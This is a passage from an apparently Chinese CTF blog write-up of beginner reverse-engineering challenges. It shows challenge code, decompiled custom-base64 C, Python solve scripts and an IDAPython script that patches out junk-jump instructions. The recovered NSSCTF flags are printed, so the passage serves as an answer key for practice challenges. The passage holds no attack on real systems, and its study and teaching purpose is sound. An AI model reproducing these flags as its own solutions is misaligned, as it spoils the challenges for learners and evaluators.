class="token operator">></span> <span class="token number">98</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>temp <span class="token operator">&lt;=</span> <span class="token number">64</span> <span class="token keyword">or</span> temp <span class="token operator">></span> <span class="token number">66</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 如果超出范围，将修改后的字符添加到结果字符串</span>        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token comment"># 如果在范围内，将修改后的字符减去 24 并添加到结果字符串</span>        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>temp <span class="token operator">-</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token comment"># 打印修改后的字符串</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可暴力枚举</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">cipher<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">"ylqq]aycqyp&#123;"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>j<span class="token operator">&lt;=</span><span class="token number">96</span> <span class="token keyword">or</span> j <span class="token operator">></span> <span class="token number">98</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>j<span class="token operator">&lt;=</span><span class="token number">64</span> <span class="token keyword">or</span> j <span class="token operator">></span> <span class="token number">66</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token builtin">ord</span><span class="token punctuation">(</span>cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token builtin">ord</span><span class="token punctuation">(</span>cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>                <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="hubuctf-2022-新生赛simple_re"><a class="markdownIt-Anchor" href="#hubuctf-2022-新生赛simple_re"></a> [HUBUCTF 2022 新生赛]simple_RE</h2><h3 id="题目描述-5"><a class="markdownIt-Anchor" href="#题目描述-5"></a> 题目描述</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//base64编码的反汇编代码，关键是遇到后要根据特征会识别:</span>__int64 __fastcall <span class="token function">sub_401570</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">,</span> _QWORD <span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// r15d</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// r12d</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// r13d</span>  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// r14</span>  _BYTE <span class="token operator">*</span>v10<span class="token punctuation">;</span> <span class="token comment">// rax</span>  _BYTE <span class="token operator">*</span>v11<span class="token punctuation">;</span> <span class="token comment">// r9</span>  __int64 v12<span class="token punctuation">;</span> <span class="token comment">// r8</span>  <span class="token keyword">char</span> v13<span class="token punctuation">;</span> <span class="token comment">// cl</span>  <span class="token keyword">char</span> v14<span class="token punctuation">;</span> <span class="token comment">// r11</span>  <span class="token keyword">char</span> v15<span class="token punctuation">;</span> <span class="token comment">// r10</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  v6 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>  v7 <span class="token operator">=</span> v6 <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">%</span> <span class="token number">3</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v8 <span class="token operator">=</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v6 <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">;</span>    v9 <span class="token operator">=</span> v8<span class="token punctuation">;</span>    v10 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>v8 <span class="token operator">+</span> <span class="token number">1</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>    v10<span class="token punctuation">[</span>v8<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token keyword">goto</span> LABEL_5<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    v8 <span class="token operator">=</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v6 <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v9 <span class="token operator">=</span> v8<span class="token punctuation">;</span>    v10 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>v8 <span class="token operator">+</span> <span class="token number">1</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>    v10<span class="token punctuation">[</span>v8<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token keyword">goto</span> LABEL_8<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  v11 <span class="token operator">=</span> v10<span class="token punctuation">;</span>  v12 <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>  <span class="token keyword">do</span>  <span class="token punctuation">&#123;</span>    v11 <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>    v13 <span class="token operator">=</span> a1<span class="token punctuation">[</span>v12<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>v11 <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> aQvejafhmuyjbac<span class="token punctuation">[</span>v13 <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    v14 <span class="token operator">=</span> a1<span class="token punctuation">[</span>v12 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>v11 <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">=</span> aQvejafhmuyjbac<span class="token punctuation">[</span><span class="token punctuation">(</span>v14 <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> v13<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x30</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    v15 <span class="token operator">=</span> a1<span class="token punctuation">[</span>v12 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    v12 <span class="token operator">+=</span> <span class="token number">3</span>i64<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>v11 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">=</span> aQvejafhmuyjbac<span class="token punctuation">[</span><span class="token punctuation">(</span>v15 <span class="token operator">>></span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> v14<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3C</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>v11 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> aQvejafhmuyjbac<span class="token punctuation">[</span>v15 <span class="token operator">&amp;</span> <span class="token number">0x3F</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> v6 <span class="token operator">></span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v12 <span class="token punctuation">)</span><span class="token punctuation">;</span>LABEL_5<span class="token operator">:</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v10<span class="token punctuation">[</span>v9 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">61</span><span class="token punctuation">;</span>    v10<span class="token punctuation">[</span>v9 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">61</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v10<span class="token punctuation">[</span>v9 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">61</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>LABEL_8<span class="token operator">:</span>  <span class="token operator">*</span>a2 <span class="token operator">=</span> v10<span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>  <span class="token operator">*</span>a3 <span class="token operator">=</span> v8<span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-4"><a class="markdownIt-Anchor" href="#exp-4"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> stringcipher<span class="token operator">=</span><span class="token string">'5Mc58bPHLiAx7J8ocJIlaVUxaJvMcoYMaoPMaOfg15c475tscHfM/8=='</span>string1<span class="token operator">=</span><span class="token string">'qvEJAfHmUYjBac+u8Ph5n9Od17FrICL/X0gVtM4Qk6T2z3wNSsyoebilxWKGZpRD'</span>string2<span class="token operator">=</span><span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>string1<span class="token punctuation">,</span>string2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#b'NSSCTF&#123;a8d4347722800e72e34e1aba3fe914ae&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><code>str.maketrans(string1, string2)</code>: 这个方法创建一个字符映射表，用于将 <code>string1</code> 中的字符替换为相应位置的 <code>string2</code> 中的字符。在这个上下文中，它用于创建一个替代规则，将密文中的字符进行解密。请确保 <code>string1</code> 和 <code>string2</code> 的长度相同，否则会引发 <code>ValueError</code>。</li><li><code>cipher.translate(str.maketrans(string1, string2))</code>: 这一行将密文 <code>cipher</code> 中的字符根据先前创建的映射表进行替换，相当于执行解密操作。</li><li><code>base64.b64decode(...)</code>: 这一行使用 base64 解码函数来解码由上一步得到的解密后的字符串。<code>b64decode</code> 函数接受一个 base64 编码的字符串，并返回其解码后的原始二进制数据。</li></ol><p>以上为关键函数解释。</p><h2 id="swpuctf-2021-新生赛非常简单的逻辑题"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛非常简单的逻辑题"></a> [SWPUCTF 2021 新生赛]非常简单的逻辑题</h2><h3 id="题目描述-6"><a class="markdownIt-Anchor" href="#题目描述-6"></a> 题目描述</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag <span class="token operator">=</span> <span class="token string">'xxxxxxxxxxxxxxxxxxxxx'</span>s <span class="token operator">=</span> <span class="token string">'wesyvbniazxchjko1973652048@$+-&amp;*&lt;>'</span>result <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s1 <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">17</span>    s2 <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">17</span>    result <span class="token operator">+=</span> s<span class="token punctuation">[</span><span class="token punctuation">(</span>s1<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token operator">+</span>s<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">(</span>s2<span class="token operator">+</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">34</span><span class="token punctuation">]</span>  <span class="token comment">#注意！这是生成两个字符并连接</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token comment"># result = 'v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-5"><a class="markdownIt-Anchor" href="#exp-5"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#不会逆，直接爆破吧</span>flag <span class="token operator">=</span> <span class="token string">''</span>s <span class="token operator">=</span> <span class="token string">'wesyvbniazxchjko1973652048@$+-&amp;*&lt;>'</span>result <span class="token operator">=</span> <span class="token string">'v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i'</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        s1<span class="token operator">=</span>j<span class="token operator">//</span><span class="token number">17</span>        s2<span class="token operator">=</span>j<span class="token operator">%</span><span class="token number">17</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>s<span class="token punctuation">[</span><span class="token punctuation">(</span>s1<span class="token operator">+</span>k<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">and</span> <span class="token punctuation">(</span>result<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span>s<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">(</span>s2<span class="token operator">+</span>k<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            k<span class="token operator">+=</span><span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># NSSCTF&#123;Fake_RERE_QAQ&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="gfctf-2021wordy"><a class="markdownIt-Anchor" href="#gfctf-2021wordy"></a> [GFCTF 2021]wordy</h2><h3 id="题目描述花指令idapython"><a class="markdownIt-Anchor" href="#题目描述花指令idapython"></a> 题目描述(花指令，idapython)</h3><p>下载附件，查壳，发现没壳，接着拖入到Ida中</p><p>打开附件，找主函数发现无法编译，考虑是花指令</p><p>可以看到标红的这段有一段代码</p><blockquote><p>loc_1144:<br /><a href="https://so.csdn.net/so/search?q=jmp&amp;spm=1001.2101.3001.7020">jmp</a>   short near ptr loc_1144+1</p></blockquote><p>这串代码并没有实际的作用，看了很多大佬 的wp才知道这 是一种常见的花指令。把这段代码nop掉就可以，即找到机械码为EBFF的，把它改成90(即为no的机械码），但是我们发现下面的数据中含有大量的EBFF机械码，手动nop坑定是很麻烦的，这时就可以使用idapython(file-Script command打开），用上脚本直接把所有的jmp花指令nop掉<br />其中startaddr时初始地址，endaddr是结束地址，get_wide_byte()函数是常用的命令，含义是get_wide_byte(ea)/get_wide_dword/word(ea)create_data(ea, dataflag, size, tid)转变为数据(byte,word,dword,etc),patch_byte(addr,byte)是设置addr处的一个字节值（其他的ida命令可以参考一位大佬的文章</p><p>之后可以直接找到flag</p><p><img src="https://www.nssctf.cn/files/2022/9/22/a0a6e683eb.jpg" alt="" / loading="lazy"></p><h4 id="非预期解"><a class="markdownIt-Anchor" href="#非预期解"></a> 非预期解</h4><p><img src="https://www.nssctf.cn/files/2022/9/22/4331c99ff1.jpg" alt="" / loading="lazy"></p><h3 id="exp-6"><a class="markdownIt-Anchor" href="#exp-6"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 利用idapython脚本解决重复工作</span>startaddr <span class="token operator">=</span> <span class="token number">0x1135</span>endaddr <span class="token operator">=</span> <span class="token number">0x3100</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>startaddr<span class="token punctuation">,</span>endaddr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> get_wide_byte<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xEB</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> get_wide_byte<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xFF</span><span class="token punctuation">:</span>            patch_byte<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x90</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Addr &#123;&#125; is patched"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="swpuctf-2021-新生赛fakerandom"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛fakerandom"></a> [SWPUCTF 2021 新生赛]fakerandom</h2><h3 id="题目描述xorfakerandom"><a class="markdownIt-Anchor" href="#题目描述xorfakerandom"></a> 题目描述(xor,fakerandom)</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> randomflag <span class="token operator">=</span> <span class="token string">'xxxxxxxxxxxxxxxxxxxx'</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    l<span class="token punctuation">.</span>append<span class="token punctuation">(</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>l<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">5</span><span class="token operator">+</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token comment"># result = [201, 8, 198, 68, 131, 152, 186, 136, 13, 130, 190, 112, 251, 93, 212, 1, 31, 214, 116, 244]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-7"><a class="markdownIt-Anchor" href="#exp-7"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#鼠鼠不会逆，只能根据异或的可逆性把答案给搞出来</span><span class="token keyword">import</span> randomflag<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">201</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">131</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">186</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">251</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">212</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">214</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">244</span><span class="token punctuation">]</span>result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    l<span class="token punctuation">.</span>append<span class="token punctuation">(</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>l<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">5</span><span class="token operator">+</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#NSSCTF&#123;FakeE_random&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看了一眼标准解法</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#本题考查的是python random模块的伪随机数相关的知识。所谓伪随机数就是设定种子之后，生成的随机数序列可以被预测（每次都一样的）。</span><span class="token comment">#random.seed(1) 是 Python 的 randm 模块中的一个函数，用于设置随机生成器的种子值</span><span class="token comment">#random.getrandbits() 是 Pytho 的 random 模块中的一个函数，用于生成定数量的随机位（bit）的整数。</span><span class="token keyword">import</span> randomrandom<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>l<span class="token punctuation">.</span>append<span class="token punctuation">(</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token comment">#l= [34, 145, 216, 205]</span>key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>l<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> n <span class="token keyword">in</span> <span 